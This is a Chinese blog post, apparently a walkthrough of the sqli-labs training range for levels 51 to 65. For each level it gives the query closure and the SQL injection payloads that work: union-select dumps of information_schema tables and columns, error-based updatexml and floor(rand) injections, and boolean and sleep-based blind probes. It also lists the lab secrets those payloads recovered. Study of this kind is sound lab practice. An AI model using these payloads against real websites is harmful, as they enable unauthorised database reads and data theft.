+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br>?sort=<span class="hljs-number">1</span>        # 正常排序<br>?sort=<span class="hljs-number">1</span>--+     # 正常排序（&#x27;<span class="hljs-number">1</span>--+&#x27;被强制类型转换为<span class="hljs-number">1</span>）<br>?sort=<span class="hljs-number">1</span>&#x27;       # 报错，order by &#x27;<span class="hljs-number">1</span>&#x27;&#x27;<br>?sort=<span class="hljs-number">1</span>&#x27;--+    # 正常排序（order by &#x27;<span class="hljs-number">1</span>&#x27;-- &#x27;）<br><br># 报错注入<br>?sort=<span class="hljs-number">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, database(), <span class="hljs-number">0x7e</span>), <span class="hljs-number">1</span>)--+<br><br></code></pre></td></tr></table></figure>
+<hr>
+<h2 id="less-52"><a href="#less-52" class="headerlink" title="less-52"></a>less-52</h2><p>闭合方式：<code>ORDER BY $id</code></p>
+<p>和 Less-50 是一样的，只是少了报错注入的利用方式。</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs perl"><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span>       <span class="hljs-comment"># 正常回显</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span>--+    <span class="hljs-comment"># 正常回显</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27;      # 不显示（order by 1&#x27;</span>，出错但是没有显示报错信息） <br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27;--+   # 不显示（order by 1&#x27;</span>--+，出错但是没有显示报错信息）<br><br><span class="hljs-comment"># 验证</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">3</span>)--+<br><span class="hljs-comment"># 有明显延时</span><br><br><span class="hljs-comment"># 布尔注入</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">rand</span>(left(database(),<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;s&#x27;</span>)<br>?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">rand</span>(left(database(),<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;r&#x27;</span>)<br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><p>闭合方式：<code>ORDER BY &#39;$id&#39;</code></p>
+<p>和 Less-51 是一样的，只是少了报错注入的利用方式。</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br>?<span class="hljs-attr">sort=1</span>        <span class="hljs-comment"># 正常回显</span><br>?<span class="hljs-attr">sort=1--+</span>     <span class="hljs-comment"># 正常回显</span><br>?<span class="hljs-attr">sort=1&#x27;</span>       <span class="hljs-comment"># 不显示</span><br>?<span class="hljs-attr">sort=1&#x27;--+</span>    <span class="hljs-comment"># 正常显示</span><br><br><span class="hljs-comment"># 验证</span><br>?<span class="hljs-attr">sort=1&#x27;</span> <span class="hljs-literal">or</span> sleep(<span class="hljs-number">3</span>)--+ <span class="hljs-comment"># 无延时</span><br>?<span class="hljs-attr">sort=0&#x27;</span> <span class="hljs-literal">or</span> sleep(<span class="hljs-number">3</span>)--+ <span class="hljs-comment"># 有明显延时</span><br><br></code></pre></td></tr></table></figure>
+
+<h1 id="5-进阶挑战-54-65"><a href="#5-进阶挑战-54-65" class="headerlink" title="5 进阶挑战(54-65)"></a>5 进阶挑战(54-65)</h1><h2 id="less-54"><a href="#less-54" class="headerlink" title="less-54"></a>less-54</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p>
+<p>判断闭合方式</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure>
+<p>判断字段数</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; order <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><span class="hljs-comment">--+</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; order <span class="hljs-keyword">by</span> <span class="hljs-number">4</span><span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure>
+<p>查看回显的字段</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br>?id=<span class="hljs-number">-1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> --+<br><br></code></pre></td></tr></table></figure>
+<p>查询表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br>?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(table_name+SEPARATOR+<span class="hljs-number">0x3c62723e</span>)+<span class="hljs-keyword">FROM</span>+INFORMATION_SCHEMA.TABLES+<span class="hljs-keyword">WHERE</span>+TABLE_SCHEMA=<span class="hljs-keyword">DATABASE</span>()) <span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure>
+<p>查询结果为<code>HLBSTFO6HB</code>，结果不唯一<br>查询列名（记得修改表名为上面的查询结果）</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br>?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(column_name+SEPARATOR+<span class="hljs-number">0x3c62723e</span>)+<span class="hljs-keyword">FROM</span>+INFORMATION_SCHEMA.COLUMNS+<span class="hljs-keyword">WHERE</span>+TABLE_NAME=<span class="hljs-number">0x484c425354464f364842</span>)<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure>
+<p>列名为：id、secret_XBJJ、sessid、tryy<br>查询表中的数据（修改字段名、表名）</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br>?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(secret_XBJJ)+<span class="hljs-keyword">FROM</span>+HLBSTFO6HB)<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure>
+<p>最后查到key值为：<code>kRTCQUzl170VXBxrCqlTWuyZ</code></p>
+<hr>
+<h2 id="less-55"><a href="#less-55" class="headerlink" title="less-55"></a>less-55</h2><p>闭合方式：<code>id=($id)</code><br>Less-55 给了 14 次尝试机会，代码基本上没有变化，只是闭合方式发生了变化。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># 验证</span><br>?id=1) <span class="hljs-comment">--+</span><br><br><span class="hljs-comment"># 查询表名</span><br>?id=-1) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(table_name+SEPARATOR+<span class="hljs-number">0x3c62723e</span>)+<span class="hljs-keyword">FROM</span>+INFORMATION_SCHEMA.TABLES+<span class="hljs-keyword">WHERE</span>+TABLE_SCHEMA=<span class="hljs-keyword">DATABASE</span>()) <span class="hljs-comment">--+</span><br><span class="hljs-comment"># P0ULLTHD09</span><br><br><span class="hljs-comment"># 查询字段名</span><br>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(column_name+SEPARATOR+<span class="hljs-number">0x3c62723e</span>)+<span class="hljs-keyword">FROM</span>+INFORMATION_SCHEMA.COLUMNS+<span class="hljs-keyword">WHERE</span>+TABLE_NAME=<span class="hljs-string">&#x27;P0ULLTHD09&#x27;</span>)<span class="hljs-comment">--+</span><br><span class="hljs-comment"># id、sessid、secret_0SEC、tryy</span><br><br><span class="hljs-comment"># 查询key值</span><br>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(secret_0SEC)+<span class="hljs-keyword">FROM</span>+P0ULLTHD09)<span class="hljs-comment">--+</span><br><span class="hljs-comment"># hSoUfCvuUNHhjG8CQInhuVv2</span><br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-56"><a href="#less-56" class="headerlink" title="less-56"></a>less-56</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code></p>
+<p>闭合方式不同。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># 查询表名</span><br>?id=-1&#x27;) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(table_name+SEPARATOR+<span class="hljs-number">0x3c62723e</span>)+<span class="hljs-keyword">FROM</span>+INFORMATION_SCHEMA.TABLES+<span class="hljs-keyword">WHERE</span>+TABLE_SCHEMA=<span class="hljs-keyword">DATABASE</span>()) <span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-57"><a href="#less-57" class="headerlink" title="less-57"></a>less-57</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code></p>
+<p>闭合方式不同。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># 查询表名</span><br>?id=-1&quot; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(table_name+SEPARATOR+<span class="hljs-number">0x3c62723e</span>)+<span class="hljs-keyword">FROM</span>+INFORMATION_SCHEMA.TABLES+<span class="hljs-keyword">WHERE</span>+TABLE_SCHEMA=<span class="hljs-keyword">DATABASE</span>()) <span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-58"><a href="#less-58" class="headerlink" title="less-58"></a>less-58</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p>
+<p>uname 和 pass 都只输出数组中的结果，union 查询无法回显。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>$unames=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Dumb&quot;</span>,<span class="hljs-string">&quot;Angelina&quot;</span>,<span class="hljs-string">&quot;Dummy&quot;</span>,<span class="hljs-string">&quot;secure&quot;</span>,<span class="hljs-string">&quot;stupid&quot;</span>,<span class="hljs-string">&quot;superman&quot;</span>,<span class="hljs-string">&quot;batman&quot;</span>,<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;admin1&quot;</span>,<span class="hljs-string">&quot;admin2&quot;</span>,<span class="hljs-string">&quot;admin3&quot;</span>,<span class="hljs-string">&quot;dhakkan&quot;</span>,<span class="hljs-string">&quot;admin4&quot;</span>);<br>$pass = ($unames);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Login name : &#x27;</span>. $unames[$row[<span class="hljs-string">&#x27;id&#x27;</span>]];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Password : &#x27;</span> .$pass[$row[<span class="hljs-string">&#x27;id&#x27;</span>]];<br><br></code></pre></td></tr></table></figure>
+<p>但是可以输出报错信息，可以尝试进行报错注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br>?id=1&#x27;+AND+(<span class="hljs-keyword">SELECT</span>+<span class="hljs-number">1</span>+<span class="hljs-keyword">FROM</span>+(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">COUNT</span>(*),<span class="hljs-keyword">CONCAT</span>((<span class="hljs-keyword">SELECT</span>(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">CONCAT</span>(<span class="hljs-keyword">CAST</span>(<span class="hljs-keyword">CONCAT</span>(secret_OD68 )+<span class="hljs-keyword">AS</span>+<span class="hljs-built_in">CHAR</span>),<span class="hljs-number">0x7e</span>))+<span class="hljs-keyword">FROM</span>+WOO6ID239T+<span class="hljs-keyword">LIMIT</span>+<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-keyword">FLOOR</span>(<span class="hljs-keyword">RAND</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x+<span class="hljs-keyword">FROM</span>+INFORMATION_SCHEMA.TABLES+<span class="hljs-keyword">GROUP</span>+<span class="hljs-keyword">BY</span>+x)a)<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure>
+
+<h2 id="less-59"><a href="#less-59" class="headerlink" title="less-59"></a>less-59</h2><p>闭合方式：<code>id=$id</code></p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br><span class="hljs-comment"># 猜测闭合方式</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>        <span class="hljs-comment"># 正常显示</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span><span class="hljs-comment">--+     # 正常显示</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;       <span class="hljs-comment"># 报错</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;<span class="hljs-comment">--+    # 报错</span><br><br><span class="hljs-comment"># 验证</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> sleep(<span class="hljs-number">3</span>) <span class="hljs-comment">--+ # 有明显延时</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> sleep(<span class="hljs-number">3</span>) <span class="hljs-comment">--+ # 无延时</span><br><br><span class="hljs-comment"># 报错注入</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, database(), <span class="hljs-number">0x7e</span>), <span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-60"><a href="#less-60" class="headerlink" title="less-60"></a>less-60</h2><p>闭合方式：<code>id=（&quot;$id&quot;）</code></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment"># 猜测闭合方式</span><br>?<span class="hljs-attribute">id</span>=1        # 正常显示（强制类型转化为1）<br>?<span class="hljs-attribute">id</span>=1--+     # 正常显示（强制类型转化为1）<br>?<span class="hljs-attribute">id</span>=1&#x27;       # 正常显示（强制类型转化为1）<br>?<span class="hljs-attribute">id</span>=1&#x27;--+    # 正常显示（强制类型转化为1）<br>?<span class="hljs-attribute">id</span>=1&quot;       # 报错,并能看到需要添加括号。<br>?<span class="hljs-attribute">id</span>=1&quot;) --+  # 正常显示<br><br><span class="hljs-comment"># 报错注入</span><br>?<span class="hljs-attribute">id</span>=0&quot;) <span class="hljs-keyword">or</span> updatexml(1, concat(0x7e, database(), 0x7e), 1)--+<br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-61"><a href="#less-61" class="headerlink" title="less-61"></a>less-61</h2><p>闭合方式：<code>id=((&#39;$id&#39;))</code></p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br><span class="hljs-comment"># 猜测闭合方式（自己手动多次后，可以考虑采用Burp Suite+字典进行测试）</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;         <span class="hljs-comment"># 报错，并且看到需要添加双层括号</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;)) <span class="hljs-comment">--+   # 正常显示</span><br><br><span class="hljs-comment"># 报错注入</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>&#x27;)) <span class="hljs-keyword">or</span> updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, database(), <span class="hljs-number">0x7e</span>), <span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-62"><a href="#less-62" class="headerlink" title="less-62"></a>less-62</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code></p>
+<p>不能报错注入</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment"># 猜测闭合方式(在猜测时，最好列举一个比较全面的闭合方式来猜测)</span><br>?<span class="hljs-attribute">id</span>=1        # 正常显示<br>?<span class="hljs-attribute">id</span>=1&#x27;       # 报错（显示<br>?<span class="hljs-attribute">id</span>=1&#x27;)--+   # 正常显示<br><br><span class="hljs-comment"># 验证</span><br>?<span class="hljs-attribute">id</span>=0&#x27;) <span class="hljs-keyword">or</span> sleep(3)--+<br><br><span class="hljs-comment"># 布尔注入</span><br>?<span class="hljs-attribute">id</span>=0&#x27;) <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(left(database(), 1)=<span class="hljs-string">&#x27;s&#x27;</span>, 1, 0)--+    # 不显示<br>?<span class="hljs-attribute">id</span>=0&#x27;) <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(left(database(), 1)=<span class="hljs-string">&#x27;c&#x27;</span>, 1, 0)--+    # 正常显示<br>?<span class="hljs-attribute">id</span>=0&#x27;) <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(left(database(), 2)=<span class="hljs-string">&#x27;ch&#x27;</span>, 1, 0)--+   # 正常显示<br><br><span class="hljs-comment"># 延时注入</span><br>?<span class="hljs-attribute">id</span>=0&#x27;) <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(left(database(), 1)=<span class="hljs-string">&#x27;s&#x27;</span>, sleep(3), 0)--+    # 不显示<br>?<span class="hljs-attribute">id</span>=0&#x27;) <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(left(database(), 1)=<span class="hljs-string">&#x27;c&#x27;</span>, sleep(3), 0)--+    # 明显延时<br>?<span class="hljs-attribute">id</span>=0&#x27;) <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(left(database(), 2)=<span class="hljs-string">&#x27;ch&#x27;</span>, sleep(3), 0)--+   # 明显延时<br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-63"><a href="#less-63" class="headerlink" title="less-63"></a>less-63</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p>
+<p>类似less-62</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment"># 猜测闭合方式</span><br>?<span class="hljs-attribute">id</span>=1        # 正常显示<br>?<span class="hljs-attribute">id</span>=1&#x27;       # 报错<br>?<span class="hljs-attribute">id</span>=1&#x27;--+    # 正常显示<br><br><span class="hljs-comment"># 验证</span><br>?<span class="hljs-attribute">id</span>=0&#x27; <span class="hljs-keyword">or</span> sleep(3)--+<br><br><span class="hljs-comment"># 布尔注入</span><br>?<span class="hljs-attribute">id</span>=0&#x27; <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(left(database(), 1)=<span class="hljs-string">&#x27;s&#x27;</span>, 1, 0)--+    # 不显示<br>?<span class="hljs-attribute">id</span>=0&#x27; <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(left(database(), 1)=<span class="hljs-string">&#x27;c&#x27;</span>, 1, 0)--+    # 正常显示<br>?<span class="hljs-attribute">id</span>=0&#x27; <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(left(database(), 2)=<span class="hljs-string">&#x27;ch&#x27;</span>, 1, 0)--+   # 正常显示<br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-64"><a href="#less-64" class="headerlink" title="less-64"></a>less-64</h2><p>闭合方式：<code>id=(($id))</code></p>
+<p>类似less-62</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br><span class="hljs-comment"># 验证</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>)) <span class="hljs-keyword">or</span> sleep(<span class="hljs-number">3</span>)<span class="hljs-comment">--+    # 明显延时</span><br><br></code></pre></td></tr></table></figure>
+
+<h2 id="less-65"><a href="#less-65" class="headerlink" title="less-65"></a>less-65</h2><p>闭合方式：<code>id=(&quot;$id&quot;)</code></p>
+<p>类似less-62</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-comment"># 验证</span><br>?<span class="hljs-attr">id=0&quot;)</span> <span class="hljs-literal">or</span> sleep(<span class="hljs-number">3</span>)--+    <span class="hljs-comment"># 明显延时</span><br><br></code></pre></td></tr></table></figure>
+
+
+<h1 id="6-思维导图"><a href="#6-思维导图" class="headerlink" title="6 思维导图"></a>6 思维导图</h1><p>自己总结的思维导图。如果有更好的想法，欢迎和我交流<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210115123359.png" srcset="/img/loading.gif"></p>
+<p>幕布地址：<a target="_blank" rel="noopener" href="https://share.mubu.com/doc/qV0gisrYy6">https://share.mubu.com/doc/qV0gisrYy6</a></p>
+<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>参考教程：</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41420747/article/details/81836327">sqli-lab教程——1-35通关Writeup-地址ch3nye.top</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/05/sqlilabs.html">SQLI labs 靶场精简学习记录-国光</a></li>
+</ol>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8/">网络空间安全</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/f3a17a5034c5/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">sql注入速查手册（不定期更新）</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/38f31199edc1/">
+                        <span class="hidden-mobile">MacOS切换JDK版本的最佳姿势</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
